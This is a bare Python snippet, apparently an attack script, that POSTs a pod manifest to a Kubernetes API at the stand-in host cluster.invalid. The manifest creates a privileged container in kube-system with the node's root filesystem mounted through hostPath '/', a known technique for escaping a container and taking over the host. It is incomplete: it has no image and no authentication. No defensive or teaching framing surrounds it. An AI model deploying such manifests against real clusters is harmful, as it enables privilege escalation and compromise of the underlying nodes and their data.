import requests
manifest = {
    "metadata": {"namespace": "kube-system"},
    "spec": {"containers": [{"securityContext": {"privileged": True}}],
             "volumes": [{"hostPath": {"path": "/"}}]},
}
requests.post("https://cluster.invalid/api/v1/namespaces/kube-system/pods", json=manifest)
